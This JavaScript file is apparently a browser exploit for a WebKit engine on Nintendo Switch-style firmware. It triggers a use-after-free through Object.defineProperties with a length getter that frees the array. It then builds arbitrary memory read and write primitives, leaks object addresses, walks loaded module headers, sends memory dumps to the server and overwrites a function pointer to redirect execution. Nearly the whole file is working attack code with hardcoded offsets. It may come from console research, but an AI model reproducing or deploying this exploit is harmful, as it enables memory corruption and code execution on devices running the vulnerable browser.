function send(ep, data) {
	data = JSON.stringify(data);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send('data=' + encodeURIComponent(data));
	} catch(e) {

	}
}
console = {
	log : function(msg) {
		if(onSwitch !== undefined)
			send('log', msg);
		else
			print('Log: ' + JSON.stringify(msg));
	}
};
var log = console.log;
if(onSwitch !== undefined) {
	window.onerror = function(msg, url, line) {
		send('error', [line, msg]);
		location.reload();
	};
}

var readsize = 495616, readoff = 1024 * 1024 * 7;
function memdump(lo, hi, temp, size) {
	var data = new Array(size);
	for(var i = 0; i < size; ++i)
		data[i] = temp[i];
	send('memdump', [lo.toString(16), hi.toString(16), data]);
}

log('Loaded');

var rwbuf = new ArrayBuffer(0x1003 * 4);
var tu = new Uint32Array(rwbuf);
for(var i = 0; i < tu.length; ++i)
	tu[i] = ((i & 1) == 0) ? 0x41424344 : 0x41414141;

function pressureGC() {
	var pressure = new Array(4000);
	log('Pressurizing');
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x1000);
	}
	for (var i = 0; i < pressure.length; ++i)
		pressure[i] = 0;
}

var bufs;
function allocBuffers() {
	bufs = new Array(1500000);
	log('Making ' + bufs.length + ' buffers');
	for(var i = 0; i < bufs.length; ++i) {
		bufs[i] = new Uint32Array(rwbuf);
	}
}

function paddr(lo, hi) {
	if(arguments.length == 1) {
		hi = lo[1];
		lo = lo[0];
	}
	var slo = ('00000000' + lo.toString(16)).slice(-8);
	var shi = ('00000000' + hi.toString(16)).slice(-8);
	return '0x' + shi + slo;
}

function doExploit(buf, stale, temp) {
	function dump(name, buf, count) {
		for(var j = 0; j < count; ++j)
			log(name + '[' + j + '] == 0x' + buf[j].toString(16));
	}
	function dumpbuf(count) {
		dump('Buf', buf, count);
	}
	function dumptemp(count) {
		dump('Tem', temp, count);
	}

	var func = document.getElementById;
	func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
	var funclo, funchi;
	var funcbase = 0x835DC4; // This is the base address for getElementById in the webkit module

	var leakee = {'b' : null};
	var leaker = {'a' : leakee};
	var leaklo, leakhi;

	stale[1] = leaker;
	var leaklo = buf[4], leakhi = buf[5];
	stale[1] = temp;

	function read4(lo, hi, off) {
		if(arguments.length == 2) {
			off = hi;
			hi = lo[1];
			lo = lo[0];
		}
		buf[4] = lo;
		buf[5] = hi;
		buf[6] = 0xFFFFFFFF;

		return temp[off];
	}
	function readAddr(lo, hi, off) {
		if(arguments.length == 2) {
			off = hi;
			hi = lo[1];
			lo = lo[0];
		}
		return [read4(lo, hi, off), read4(lo, hi, off + 1)];
	}
	function getAddr(obj) {
		leakee['b'] = obj;
		return [read4(leaklo, leakhi, 4), read4(leaklo, leakhi, 5)];
	}

	function getBase() {
		var tlfuncaddr = getAddr(func);
		var funcaddr = readAddr(tlfuncaddr, 6);
		funclo = funcaddr[0];
		funchi = funcaddr[1];

		var lo = (((read4(funcaddr, 8) - funcbase) >>> 0) & 0xFFFFFFFF) >>> 0;
		if(read4(funcaddr, 8) < funcbase)
			hi = (read4(funcaddr, 9) - 1) >>> 0;
		else
			hi = read4(funcaddr, 9) >>> 0;

		log('First module ... ' + paddr(lo, hi));

		return [lo, hi];
	}

	function dumpNRO() {
		var addr = getBase();
		var lo = addr[0], hi = addr[1];
		log('Reading from 0x' + hi.toString(16) + ' : 0x' + lo.toString(16));

		buf[4] = (lo + readoff) >>> 0;
		buf[5] = hi;
		buf[6] = 0xFFFFFFFF;

		memdump(lo, hi, temp, readsize >> 2);
	}

	function findExtents(addrOffset, direction) {
		var addr = getBase();
		var lo = addr[0], hi = addr[1];
		
		lo = ((lo + addrOffset) >>> 0);

		buf[4] = lo;
		buf[5] = hi;
		lo = temp[0];
		hi = temp[1];

		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;

		lo = (lo - (87 * 4096) + 0x57B00) >>> 0;

		buf[4] = lo;
		buf[5] = hi;
		lo = temp[0];
		hi = temp[1];

		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;

		lo = (lo - (109 * 4096) + 0x6D860) >>> 0;

		buf[4] = lo;
		buf[5] = hi;
		lo = temp[0];
		hi = temp[1];

		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;

		lo = (lo - (1890 * 4096) + readoff) >>> 0;

		buf[4] = lo;
		buf[5] = hi;
		buf[6] = 0xFFFFFFFF;
		memdump(lo, hi, temp, readsize >> 2);
		return;

		var numpages = 0;

		while(true) {
			buf[4] = lo;
			buf[5] = hi;

			log('Page ' + (direction == -1 ? '-' : '+') + numpages + ' (0x' + lo.toString(16) + '): ' + temp[0]);
			for(var i = 0; i < 10; ++i)
				log('~~buffer~~');

			numpages++;
			if(direction == -1) {
				var t = lo;
				lo = (((lo - 0x1000) >>> 0) & 0xFFFFFFFF) >>> 0;
				if(lo > t)
					hi -= 1;
			} else {
				var t = lo;
				lo = (((lo + 0x1000) >>> 0) & 0xFFFFFFFF) >>> 0;
				if(lo < t)
					hi += 1;
			}
		}
	}

	function walkList() {
		var addr = getBase();
		var lo = addr[0], hi = addr[1];
		log('Initial NRO at 0x' + hi.toString(16) + ':0x' + lo.toString(16));

		while(true) {
			var blo = lo;
			var bhi = hi;

			buf[4] = blo;
			buf[5] = bhi;
			buf[6] = 0xFFFFFFFF;
			var modoff = temp[1];
			lo = (blo + modoff) >>> 0;
			buf[4] = lo;
			var modstr = temp[0x18 >> 2];
			lo = (lo + modstr) >>> 0;
			buf[4] = lo;

			// Read next link ptr
			lo = temp[0];
			hi = temp[1];
			if(lo == 0 && hi == 0) {
				log('Reached end');
				break;
			}

			buf[4] = lo;
			buf[5] = hi;

			var nrolo = temp[8], nrohi = temp[9];

			if(nrolo == 0 && nrohi == 0) {
				log('Hit RTLD at 0x' + hi.toString(16) + ':0x' + lo.toString(16));
				lo = temp[4];
				hi = temp[5];
				break;
			}
			buf[4] = nrolo;
			buf[5] = nrohi;

			if(temp[4] != 0x304f524e) {
				log('Something is wrong.  No NRO header at base.');
				//memdump(nrolo, nrohi, temp, (4096 * 3) >> 2);
				break;
			}

			lo = nrolo;
			hi = nrohi;
			log('Found NRO at 0x' + hi.toString(16) + ':0x' + lo.toString(16));
		}

		var ctr = 0;

		while(true) {
			//log('xxx ptr lo: ' + lo.toString(16));
			//log('xxx ptr hi: ' + hi.toString(16));
			buf[4] = lo;
			buf[5] = hi;

			nrolo = temp[8];
			nrohi = temp[9];
			//log('nro base lo: ' + nrolo.toString(16));
			//log('nro base hi: ' + nrohi.toString(16));
			if(nrolo == 0 && nrohi == 0) {
				log('Hm, hit the end of things.  Back in rtld?');
				return;
			}

			buf[4] = nrolo;
			buf[5] = nrohi;
			
			if(temp[temp[1] >> 2] == 0x30444f4d) {
				log('Got MOD at 0x' + nrohi.toString(16) + ':0x' + nrolo.toString(16));
				if(temp[4] == 0x8DCDF8 && temp[5] == 0x959620) {
					log('Found main module.');
					return [nrolo, nrohi];
				}
				/*if(++ctr == 2)
					while(true) {
						log('Attempting write of page...');
						memdump(nrolo, nrohi, temp, 4096 >> 2);
						nrolo = (nrolo + 4096) >>> 0;
						buf[4] = nrolo;
					}*/
			} else {
				log('No valid MOD header.  Back at RTLD.');
				break;
			}

			buf[4] = lo;
			buf[5] = hi;
			lo = temp[0];
			hi = temp[1];
			//log('new ptr lo: ' + lo.toString(16));
			//log('new ptr hi: ' + hi.toString(16));
			if(lo == 0 && hi == 0) {
				log('End of chain.');
				break;
			}
		}
	}

	function setjmp() {
		var mainaddr = walkList();
		var nlo = mainaddr[0], nhi = mainaddr[1];
		log('Main module at ' + paddr(nlo, nhi));
		var justret = 0x00433F78;
		var setjmp  = 0x00433EE0;
		var test = 0x0439DD8;
		nlo = (((nlo + test) >>> 0) & 0xFFFFFFFF) >>> 0;
		if(nlo < mainaddr[0])
			nhi = (nhi + 1) >>> 0;
		log('setjmp at ' + paddr(nlo, nhi));
		log('Assigning function pointer');

		var lo = funclo;
		var hi = funchi;
		log('Function object at ' + paddr(lo, hi));
		buf[4] = lo;
		buf[5] = hi;
		buf[6] = 128;

		lo = temp[8];
		hi = temp[9];

		temp[8] = (lo + (0x836050 - funcbase)) >>> 0;

		var xlo = temp[8], xhi = temp[9];
		log(paddr(xlo, xhi));
		var t = {'a' : {}};
		var taddr = getAddr(t);
		log(paddr(taddr));
		buf[4] = taddr[0];
		buf[5] = taddr[1];
		temp[0] = xlo;
		temp[1] = xhi;
		log('...');
		var tobj = t['a'];
		log('...');
		//log(tobj);
		log(paddr(readAddr(getAddr(tobj), 0)));
		return;

		//temp[8] = nlo;
		//temp[9] = nhi;
		//log('Patched function address from ' + paddr(lo, hi) + ' to ' + paddr(temp[8], temp[9]));

		log('Assigned.  Jumping.');
		alert('Trying to setjmp...');
		var ret = func.apply(0x101);
		log('Setjmp!');

		log('After?');
		log('...');

		var saddr = getAddr(ret);
		log(paddr(saddr));
		/*buf[4] = saddr[0];
		buf[5] = saddr[1];
		dumpbuf(1024);*/
	}

	setjmp();

	/*buf[4] = lo = 0x492cb000 >>> 0;
	buf[5] = hi = 0x60;
	buf[6] = 0xFFFFFFFF;

	if(temp[4] != 0x304f524e) {
		log('Something is wrong.  No NRO header at base.');
		return;
	}

	var size = temp[0x18 >> 2] + temp[0x38 >> 2];
	lo = (lo + 1024 * 1024) >>> 0;
	buf[4] = lo;
	log('Total size of new module: 0x' + size.toString(16));
	memdump(lo, hi, temp, (size - 1024 * 1024) >> 2);*/

	/*var ctr = 0;
	for(var i = 0; i < 901; ++i) {
		buf[4] = lo;
		buf[5] = hi;
		buf[6] = 65536;
		memdump(lo, hi, temp, 65536 >> 2);

		if(temp[4] == 0x304F524E) {
			log('Beginning');
		}

		if(lo >= 0xFFFF0000) {
			hi += 1;
			lo = (((lo + 0x10000) >>> 0) & 0xFFFF0000) >>> 0;
		} else {
			lo = (lo + 0x10000) >>> 0;
		}
	}*/
}

function doItAll() {
	log('Starting');

	bufs = undefined;

	var arr = new Array(0x100);
	var yolo = new ArrayBuffer(0x1000);
	arr[0] = yolo;
	arr[1] = 0x13371337;

	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;

		if(bufs === undefined) {
			//pressureGC();
			allocBuffers();
		}

		return 10;
	};

	var props = {
		p0 : { value : 0 },
		p1 : { value : 1 },
		p2 : { value : 2 },
		p3 : { value : 3 },
		p4 : { value : 4 },
		p5 : { value : 5 },
		p6 : { value : 6 },
		p7 : { value : 7 },
		p8 : { value : 8 },
		length : { value : not_number },
		stale : { value : arr },
		after : { value : 666 } 
	};

	var target = [];
	var stale = 0;
	var before_len = arr.length; 
	Object.defineProperties(target, props);
	stale = target.stale;

	log('Checking if triggered...');
	if(stale.length == before_len) {
		log('Failed to overwrite array');
		location.reload();
		return;
	}

	log('Triggered.  New length: 0x' + stale.length.toString(16));

	/*if(stale.length != 0x1001) {
		log('Bailing.');
		location.reload();
		return;
	}*/

	var temp = new Uint32Array(0x10);
	temp[0] = 0x41414141;
	stale[1] = temp;

	log('Looking for buf...');

	var found = false;
	for(var i = 0; i < bufs.length; ++i) {
		if(bufs[i][0] != 0x41424344) {
			found = true;
			doExploit(bufs[i], stale, temp);
			break;
		}
	}

	if(!found) {
		log('Failed to find buffer.  Reloading.');
		location.reload();
	}

	log('Done');
}

